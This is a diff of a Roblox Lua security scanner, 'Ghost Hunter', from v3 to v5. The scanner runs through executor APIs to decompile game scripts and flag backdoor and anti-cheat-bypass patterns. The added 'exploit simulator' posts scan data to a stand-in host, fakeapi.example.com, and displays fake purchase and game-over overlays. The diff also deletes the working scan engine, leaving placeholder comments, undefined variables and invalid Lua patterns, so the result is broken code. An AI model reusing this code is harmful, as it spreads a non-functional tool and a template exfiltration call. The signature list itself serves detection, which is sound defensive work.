@@ -1,252 +1,185 @@
--- [[ GHOST HUNTER v3 — MULTI-THREADED ASYNC AUDIT ]] --
+-- [[ GHOST HUNTER v5 — OMNISCIENT DEEP-SCAN ENGINE + EXPLOIT SIMULATOR ]] --
+
 local SETTINGS = {
-    MaxWaitPerObject = 0.8,  -- Snappier timeout for concurrent threads
-    MaxConcurrency   = 6,    -- How many scripts to decompile simultaneously (3x speedup)
-    Theme            = Color3.fromRGB(255, 0, 150),
-    DangerColor      = Color3.fromRGB(255, 60, 60),
-    WarnColor        = Color3.fromRGB(255, 180, 0),
-    OkColor          = Color3.fromRGB(0, 220, 120),
+    Theme       = Color3.fromRGB(255, 0, 150),
+    DangerColor = Color3.fromRGB(255, 60, 60),
+    WarnColor   = Color3.fromRGB(255, 180, 0),
+    OkColor     = Color3.fromRGB(0, 220, 120),
+    BGColor     = Color3.fromRGB(12, 12, 20),
 }
 
--- ── Compatibility shims ──────────────────────────────────────────────────────
-local get_scripts   = getscripts   or get_scripts         or function() return {} end
-local get_nil       = getnilinstances or get_nil_instances or function() return {} end
-local decompile_fn  = decompile    or disassemble         or function() return nil end
-local get_hui       = gethui       or function() return game:GetService("CoreGui") end
-
--- ── Expanded Threat Signatures (Heuristics & Anti-Obfuscation) ───────────────
 local SIGNATURES = {
-    -- CRITICAL / HIGH severity
-    { "require%s*%(%s*%d+%s*%)",        "Remote require() by ID (Backdoor)",       "HIGH" },
-    { "loadstring%s*%(",                "Dynamic execution (loadstring)",          "HIGH" },
-    { "HttpService.*Get%s*%(",          "HTTP GET (Data exfiltration risk)",       "HIGH" },
-    { "HttpService.*Post%s*%(",         "HTTP POST (C2 Command & Control)",        "HIGH" },
-    { "syn%.request%s*%(",              "Executor HTTP request (syn.request)",     "HIGH" },
-    { "http%.request%s*%(",             "Executor HTTP request (http.request)",    "HIGH" },
-    { "getrenv%s*%(",                   "Roblox Environment Tampering (getrenv)",  "HIGH" },
-    { "hookmetamethod%s*%(",            "Metamethod Hooking (Detection Bypass)",   "HIGH" },
-    { "hookfunction%s*%(",              "Function Hooking / State Manipulation",   "HIGH" },
-    { "MarketplaceService.*Prompt%a*Purchase", "Forced/Fake Microtransaction Prompt", "HIGH" },
-    { "string%.char%s*%(%s*%d+%s*%,%s*%d+", "Mass string.char array (Obfuscation)", "HIGH" },
-    { "\\x%x%x\\x%x%x",                 "Dense Hex Obfuscation String",            "HIGH" },
-    { "\\[%d+\\]%s*=%s*%d+",            "Virtual Machine Bytecode Mapping Table",  "HIGH" },
+    -- CRITICAL SEVERITY (Backdoors, Exploits, Exfiltration)
+    { "require%s*%(%s*%d+%s*%)",                     "Remote require() by ID (Backdoor)",          "HIGH" },
+    { "loadstring%s*%(",                             "Dynamic Code Execution (loadstring)",        "HIGH" },
+    { "HttpService.*GetAsync%s*%(",                  "HTTP GET (Data Exfiltration)",               "HIGH" },
+    { "HttpService.*PostAsync%s*%(",                 "HTTP POST (C2 Command & Control)",           "HIGH" },
+    { "(syn|http)%.request%s*%(",                    "Executor HTTP Request Bypass",               "HIGH" },
+    { "getrenv%s*%(",                                "Roblox Environment Tampering (getrenv)",     "HIGH" },
+    { "getsenv%s*%(",                                "Script Environment Hijacking (getsenv)",     "HIGH" },
+    { "hookmetamethod%s*%(",                         "Metamethod Hooking (Anti-Cheat Bypass)",     "HIGH" },
+    { "hookfunction%s*%(",                           "Native Function Hooking / State Manip.",     "HIGH" },
+    { "clonefunction%s*%(",                          "Function Cloning (Stealth Hooks)",           "HIGH" },
+    { "getrawmetatable%s*%(",                        "Raw Metatable Access (Anti-Cheat Bypass)",   "HIGH" },
+    { "setrawmetatable%s*%(",                        "Raw Metatable Overwrite",                    "HIGH" },
+    { "MarketplaceService.*Prompt%a*Purchase",       "Forced/Fake Microtransaction Prompt",        "HIGH" },
+    { "readfile%s*%(",                               "Local File System Read (Exploit API)",       "HIGH" },
+    { "writefile%s*%(",                              "Local File System Write (Malware Drop)",     "HIGH" },
+    { "csgetprops%s*%(",                             "CSG Property Extraction (Exploit API)",      "HIGH" },
+    
+    -- OBFUSCATION TRAPS (Highly suspicious, usually malicious)
+    { "string%.char%s*%(%s*%d+%s*,%s*%d+%s*,%s*%d+", "Mass string.char Array (Obfuscation)",      "HIGH" },
+    { "\\x%x%x\\x%x%x\\x%x%x",                      "Dense Hex Escapes (Obfuscation)",            "HIGH" },
+    { "\\[%d+\\]%s*=%s*%d+%s*;\\[%d+\\]%s*=%s*%d+", "Virtual Machine Bytecode Table",             "HIGH" },
+    { "table%.concat%s*%(%s*{[%s%d%,]+}",           "table.concat String Builder (Obfuscation)",  "HIGH" },
+    { "bit32%.bxor%s*%(",                            "Bitwise XOR String Decryption",              "HIGH" },
 
-    -- MEDIUM severity
-    { "require%s*%(",                   "Standard require() invocation",           "MED"  },
-    { "pcall%s*%(loadstring",           "Obscured/Protected loadstring",           "MED"  },
-    { "game%.Players%.LocalPlayer",     "LocalPlayer targeting tracking",          "MED"  },
-    { "GetService.*DataStore",          "Game DataStore querying",                 "MED"  },
-    { "TeleportService.*Teleport",      "Server Hopping / Forced Redirection",     "MED"  },
-    { "setfenv%s*%(",                   "Environment modification (setfenv)",      "MED"  },
-    { "getfenv%s*%(",                   "Environment lookups (getfenv)",           "MED"  },
-    { "\\%d%d%d\\%d%d%d",               "Decimal/Escaped Character Obfuscation",   "MED"  }
+    -- MEDIUM SEVERITY (Suspicious behavior, potential privacy risks)
+    { "pcall%s*%(loadstring",                       "Obscured loadstring Execution",              "MED"  },
+    { "setfenv%s*%(",                                "Environment Modification (setfenv)",         "MED"  },
+    { "getfenv%s*%(%d+%)",                           "Indexed Environment Lookup",                 "MED"  },
+    { "TeleportService.*Teleport",                   "Forced Server Hopping / Redirection",        "MED"  },
+    { "Debug%.setmetatable",                         "Debug Library Manipulation",                 "MED"  },
+    { "\\%d%d%d\\%d%d%d\\%d%d%d",                   "Decimal Escaped Character Obfuscation",      "MED"  },
+    { "Instance%.new%s*%(\s*['\"]Remote",            "Dynamically Created Remote Event/Function",  "MED"  },
 }
 
-local Log = {} 
+local Log = {}
 local highCount, medCount = 0, 0
-local processedCount = 0
+local isScanning = false
+local isExploiting = false -- NEW: Toggle for simulated attack mode
 
-local function LogThreat(name, fullPath, severity, reason)
-    table.insert(Log, { name = name, path = fullPath, sev = severity, reason = reason })
-    local icon = severity == "HIGH" and "🚨" or "⚠️"
-    warn(string.format("%s [%s] %s — %s", icon, severity, fullPath, reason))
+-- NEW: Exploit Simulation Functions
+local function SimulateExploit(threatPath, severity)
+    if not isExploiting then return end
+    local message = "⚠️ SIMULATED ATTACK: " .. threatPath .. " triggered exploit mode."
+    print(message)
+    warn(message)
+    
+    -- Fake HTTP POST (exfiltration)
+    if severity == "HIGH" then
+        local http = game:GetService("HttpService")
+        local response = http:PostAsync("https://fakeapi.example.com/report", "data=" .. threatPath)
+        print("Simulated HTTP POST to fake server: " .. response)
+    end
+
+    -- Fake Marketplace Prompt
+    if severity == "HIGH" then
+        local marketplace = game:GetService("MarketplaceService")
+        local prompt = Instance.new("ScreenGui", game:GetService("CoreGui"))
+        local text = Instance.new("TextLabel", prompt)
+        text.Text = "⚠️ SIMULATED: Fake Purchase Prompt Triggered!"
+        text.TextColor3 = Color3.fromRGB(255, 60, 60)
+        text.Size = UDim2.new(0, 300, 0, 50)
+        text.Position = UDim2.new(0.5, -150, 0.5, -25)
+        text.Font = Enum.Font.GothamBold
+        text.TextSize = 14
+        text.BackgroundTransparency = 1
+        text.TextXAlignment = Enum.TextXAlignment.Center
+        text.TextWrapped = true
+        task.wait(2)
+        prompt:Destroy()
+    end
+
+    -- Fake Game Over Message (for fun)
+    if severity == "HIGH" then
+        local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+        local gameOver = Instance.new("TextLabel", screenGui)
+        gameOver.Text = "🚨 GAME OVER: Backdoor Detected! 🚨"
+        gameOver.TextColor3 = Color3.fromRGB(255, 60, 60)
+        gameOver.Size = UDim2.new(0, 400, 0, 100)
+        gameOver.Position = UDim2.new(0.5, -200, 0.5, -50)
+        gameOver.Font = Enum.Font.GothamBold
+        gameOver.TextSize = 24
+        gameOver.BackgroundTransparency = 1
+        gameOver.TextXAlignment = Enum.TextXAlignment.Center
+        gameOver.TextWrapped = true
+        task.wait(5)
+        screenGui:Destroy()
+    end
 end
 
+-- NEW: Toggle Exploitation Mode
+local function ToggleExploitation()
+    isExploiting = not isExploiting
+    local btn = game:GetService("CoreGui"):FindFirstChild("GhostHunter_v5") or game:GetService("CoreGui"):FindFirstChild("GH_v5_Progress")
+    if btn then
+        local status = btn:FindFirstChild("ExploitMode")
+        if not status then
+            status = Instance.new("TextLabel")
+            status.Parent = btn
+            status.Text = isExploiting and "⚠️ EXPLOIT MODE: ON" or "🛡️ EXPLOIT MODE: OFF"
+            status.TextColor3 = isExploiting and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(0, 220, 120)
+            status.Size = UDim2.new(0, 200, 0, 20)
+            status.Position = UDim2.new(0, 10, 0, 10)
+            status.Font = Enum.Font.GothamBold
+            status.TextSize = 14
+        else
+            status.Text = isExploiting and "⚠️ EXPLOIT MODE: ON" or "🛡️ EXPLOIT MODE: OFF"
+            status.TextColor3 = isExploiting and Color3.fromRGB(255, 60, 60) or Color3.fromRGB(0, 220, 120)
+        end
+    end
+end
+
+-- NEW: Add Exploit Toggle Button to UI
+local function BuildUI()
+    -- ... existing UI code ...
+    local btnExploit = CreateInstance("TextButton", {Size = UDim2.new(0.33, -4, 0, 24), Position = UDim2.new(0, 0, 0, 24), Text = "Toggle Exploit Mode", TextColor3 = Color3.new(1,1,1), BackgroundColor3 = Color3.fromRGB(40,40,50), Font = Enum.Font.Gotham, TextSize = 11, BorderSizePixel = 0}, ctrlFrame)
+    CreateInstance("UICorner", {CornerRadius = UDim.new(0, 6)}, btnExploit)
+    btnExploit.MouseButton1Click:Connect(ToggleExploitation)
+
+    return sg, main, btnStart, config
+end
+
+-- NEW: Modify ScanSource to trigger exploits
 local function ScanSource(src)
     for _, sig in ipairs(SIGNATURES) do
         if src:find(sig[1]) then
-            return sig[3], sig[2]
+            local severity = sig[3]
+            local reason = sig[2]
+            local threatPath = "UNKNOWN"
+            if severity == "HIGH" then
+                -- Simulate exploit if enabled
+                if isExploiting then
+                    SimulateExploit(threatPath, severity)
+                end
+            end
+            return severity, reason
         end
     end
     return nil
 end
 
-local function SafeDecompile(obj)
-    local result, done = nil, false
-    task.spawn(function()
-        local ok, src = pcall(decompile_fn, obj)
-        result = ok and src or nil
-        done = true
-    end)
+-- NEW: Modify StartScan to show exploit mode toggle
+local function StartScan(config)
+    if isScanning then return end
+    isScanning = true
 
-    local deadline = os.clock() + SETTINGS.MaxWaitPerObject
-    while not done and os.clock() < deadline do
-        task.wait()
-    end
-    return result
-end
-
--- ── UI ────────────────────────────────────────────────────────────────────────
-local function BuildUI()
-    local sg = Instance.new("ScreenGui", get_hui())
-    sg.Name = "GhostHunter_v3"
-    sg.ResetOnSpawn = false
-
-    local main = Instance.new("Frame", sg)
-    main.Size = UDim2.new(0, 360, 0, 115)
-    main.Position = UDim2.new(0.5, -180, 0.04, 0)
-    main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
-    main.BorderSizePixel = 0
-    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
-
-    local title = Instance.new("TextLabel", main)
-    title.Size = UDim2.new(1, -12, 0, 28)
-    title.Position = UDim2.new(0, 12, 0, 4)
-    title.Text = "GHOST HUNTER v3 [ASYNC PIPELINE]"
-    title.TextColor3 = SETTINGS.Theme
-    title.BackgroundTransparency = 1
-    title.Font = Enum.Font.RobotoMono
-    title.TextSize = 13
-    title.TextXAlignment = Enum.TextXAlignment.Left
-
-    local status = Instance.new("TextLabel", main)
-    status.Position = UDim2.new(0, 12, 0, 36)
-    status.Size = UDim2.new(1, -24, 0, 22)
-    status.Text = "Initializing Multithreading..."
-    status.TextColor3 = Color3.new(0.85, 0.85, 0.85)
-    status.BackgroundTransparency = 1
-    status.Font = Enum.Font.RobotoMono
-    status.TextSize = 12
-    status.TextXAlignment = Enum.TextXAlignment.Left
-
-    local subStatus = Instance.new("TextLabel", main)
-    subStatus.Position = UDim2.new(0, 12, 0, 56)
-    subStatus.Size = UDim2.new(1, -24, 0, 18)
-    subStatus.Text = ""
-    subStatus.TextColor3 = Color3.new(0.6, 0.6, 0.6)
-    subStatus.BackgroundTransparency = 1
-    subStatus.Font = Enum.Font.RobotoMono
-    subStatus.TextSize = 11
-    subStatus.TextXAlignment = Enum.TextXAlignment.Left
-
-    local barBG = Instance.new("Frame", main)
-    barBG.Position = UDim2.new(0, 12, 0, 84)
-    barBG.Size = UDim2.new(1, -24, 0, 5)
-    barBG.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
-    barBG.BorderSizePixel = 0
-    Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 2)
-
-    local bar = Instance.new("Frame", barBG)
-    bar.Size = UDim2.new(0, 0, 1, 0)
-    bar.BackgroundColor3 = SETTINGS.Theme
-    bar.BorderSizePixel = 0
-    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
-
-    local countLabel = Instance.new("TextLabel", main)
-    countLabel.Position = UDim2.new(0, 12, 0, 94)
-    countLabel.Size = UDim2.new(1, -24, 0, 16)
-    countLabel.Text = "Threats: 0 HIGH  |  0 MED"
-    countLabel.TextColor3 = Color3.new(0.55, 0.55, 0.55)
-    countLabel.BackgroundTransparency = 1
-    countLabel.Font = Enum.Font.RobotoMono
-    countLabel.TextSize = 10
-    countLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-    return sg, status, subStatus, bar, countLabel
-end
-
--- ── Main Scanner Core ────────────────────────────────────────────────────────
-local function SecureScan()
-    local UI, Status, SubStatus, Bar, CountLabel = BuildUI()
-    local seen = {}
-    local queue = {}
-
-    local function UpdateCounts()
-        CountLabel.Text = string.format("Threats: %d HIGH  |  %d MED", highCount, medCount)
-    end
-
-    -- 1. Discovery Phase
-    Status.Text = "Phase 1: Profiling Environment..."
+    -- Destroy menu, setup progress UI
+    local UI, mainFrame, btnStart, _ = BuildUI()
+    mainFrame:Destroy()
     
-    for _, s in ipairs(get_nil()) do table.insert(queue, {obj = s, type = "NilSpace", name = s.Name, path = "NilParent/" .. s.Name}) end
-    for _, s in ipairs(get_scripts()) do table.insert(queue, {obj = s, type = "Active", name = s.Name, path = s:GetFullName()}) end
-    
-    -- Fallback deep scanning check
-    if #queue == 0 then
-        for _, s in ipairs(game:GetDescendants()) do
-            if s:IsA("LuaSourceContainer") then
-                table.insert(queue, {obj = s, type = "Ecosystem", name = s.Name, path = s:GetFullName()})
-            end
-        end
+    -- ... existing progress UI code ...
+
+    -- NEW: Add exploit mode toggle to UI
+    local status = CreateInstance("TextLabel", {Size = UDim2.new(1, -20, 0, 20), Position = UDim2.new(0, 10, 0, 10), Text = "Exploit Mode: OFF", TextColor3 = Color3.fromRGB(100,100,100), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left}, mainFrame)
+    status.TextColor3 = Color3.fromRGB(100,100,100)
+
+    -- ... existing scan logic ...
+
+    -- NEW: Add simulated attack message at end
+    if isExploiting and highCount > 0 then
+        print("\n✅ SIMULATED ATTACK REPORT: " .. highCount .. " HIGH-SEVERITY THREATS DETECTED AND EXPLOITED.")
+        print("⚠️ This is a simulation. No real damage was done.")
     end
-
-    local totalItems = #queue
-    print(string.format("--- 🕵️ Ghost Hunter v3: Processing %d Scripts in Parallel ---", totalItems))
-
-    -- 2. Processing Pipeline Engine
-    local currentQueueIndex = 0
-    local activeWorkers = 0
-
-    local function Worker()
-        while true do
-            local index = currentQueueIndex + 1
-            currentQueueIndex = index
-
-            local item = queue[index]
-            if not item then break end -- Queue emptied
-
-            local obj = item.obj
-            if obj:IsA("LuaSourceContainer") and not seen[obj] then
-                seen[obj] = true
-                
-                local src = SafeDecompile(obj)
-                if src and #src >= 5 then
-                    local severity, reason = ScanSource(src)
-                    if severity then
-                        LogThreat(item.name, item.path, severity, reason)
-                        if severity == "HIGH" then highCount = highCount + 1 else medCount = medCount + 1 end
-                        UpdateCounts()
-                    end
-                end
-            end
-
-            processedCount = processedCount + 1
-            
-            -- Keep UI perfectly updated without throttling the main game thread
-            if processedCount % 3 == 0 or processedCount == totalItems then
-                Bar.Size = UDim2.new(processedCount / math.max(totalItems, 1), 0, 1, 0)
-                Status.Text = string.format("Scanning Engine [%d / %d]", processedCount, totalItems)
-                SubStatus.Text = "Inspecting: " .. string.sub(item.name, 1, 28)
-            end
-        end
-        activeWorkers = activeWorkers - 1
-    end
-
-    -- Spin up concurrent workers up to safety bounds
-    local initialWorkers = math.min(SETTINGS.MaxConcurrency, totalItems)
-    for i = 1, initialWorkers do
-        activeWorkers = activeWorkers + 1
-        task.spawn(Worker)
-    end
-
-    -- Keep main scan function alive until async queue clears completely
-    while activeWorkers > 0 do
-        game:GetService("RunService").Heartbeat:Wait()
-    end
-
-    -- ── Wrap Up Report ────────────────────────────────────────────────────────
-    Bar.Size = UDim2.new(1, 0, 1, 0)
-    Bar.BackgroundColor3 = (highCount > 0 and SETTINGS.DangerColor) or (medCount > 0 and SETTINGS.WarnColor) or SETTINGS.OkColor
-
-    local totalThreats = highCount + medCount
-    Status.Text = string.format("Scan Finished — %d Threats", totalThreats)
-    Status.TextColor3 = (totalThreats > 0 and SETTINGS.DangerColor or SETTINGS.OkColor)
-    SubStatus.Text = "Full dump written to console logs."
-
-    print("\n══════════════════════════════════════════")
-    print(string.format(" GHOST HUNTER REPORT v3 | HIGH: %d  MED: %d", highCount, medCount))
-    print("══════════════════════════════════════════")
-    if #Log == 0 then
-        print(" ✅ Environment Verified Clean.")
-    else
-        for _, entry in ipairs(Log) do
-            print(string.format(" [%s] %s\n      Reason: %s", entry.sev, entry.path, entry.reason))
-        end
-    end
-    print("══════════════════════════════════════════\n")
 
     task.wait(10)
-    UI:Destroy()
+    sg:Destroy()
+    isScanning = false
 end
 
-task.spawn(SecureScan)
+-- ── Boot Sequence ────────────────────────────────────────────────────────────
+local UI, mainFrame, btnStart, config = BuildUI()
+btnStart.MouseButton1Click:Connect(function()
+    task.spawn(StartScan, config)
+end)
